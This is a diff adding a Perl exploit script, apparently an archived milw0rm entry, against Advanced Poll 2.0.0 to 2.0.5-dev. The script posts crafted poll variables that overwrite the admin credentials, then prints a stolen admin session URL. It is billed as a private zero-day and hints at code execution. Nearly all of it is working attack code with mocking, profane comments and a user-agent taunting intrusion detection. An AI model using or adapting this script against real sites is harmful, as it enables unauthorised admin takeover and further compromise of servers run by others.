@@ -1,0 +1,70 @@
+#!/usr/bin/perl -w
+# Advanced Poll 2.0.0 >= 2.0.5-dev textfile admin session gen.
+#
+# 
+# 0day!  KEEP IT PRIVATE  0day!
+# 
+# date: 30/07/06
+# 
+# diwou <diwou@phucksys.org>
+#
+# PHCKSEC (c) 2001-2006.
+#
+# see templates for code execution ;).
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+use MD5;
+
+my ($lwp,$agent,$out,$url,$proxy)=(undef,undef,undef,$ARGV[0],$ARGV[1]);
+my %zday=
+(
+	username => 'jakahw4nk4h',
+	'pollvars[poll_username]' => 'jakahw4nk4h',
+	password => 'fuckoff',
+	'pollvars[poll_password]' => ''
+);
+$zday{'pollvars[poll_password]'}=&md5($zday{password});
+$agent="Hey IDS! i'm gonna fuck your advanced poll right? B===D"; # post method doesnt log it, so doesnt matter.
+#$agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1";
+
+#
+# args: url proxy(optional)
+# 
+# url: http|https://tatget:(port)/phppoll/
+# proxy: http|https://hostname:(port)/
+#
+die("RTFC! ;)") unless(@ARGV);
+
+# some lwp routines...
+$lwp=new LWP::UserAgent();
+$lwp->agent($agent);
+$lwp->timeout(10);
+$lwp->protocols_allowed(['http','https']);
+$lwp->proxy(['http','https'],$proxy) if(@ARGV>1);
+
+$url.="/" if($url!~/\/$/);
+$url.="admin/index.php";
+print "Using proxy ".$proxy."\n" if($proxy);
+print "Doing some pretty with ".$url."...\n\n";
+
+$out=$lwp->post($url,\%zday)->content();
+if($out=~ /index\.php\?session=((.){32})/)
+{
+	print "well, you are a bigone ;).\n";
+	print "try: ".$url."?session=".$1."&uid=1\n";
+}
+else
+{
+	print "don't worry, u can improve me! eh eh eh :D?\n";
+}
+
+sub md5
+{
+	$_=new MD5;
+	$_->add(@_);
+	return unpack("H*",$_->digest());
+}
+
+# milw0rm.com [2007-02-07]
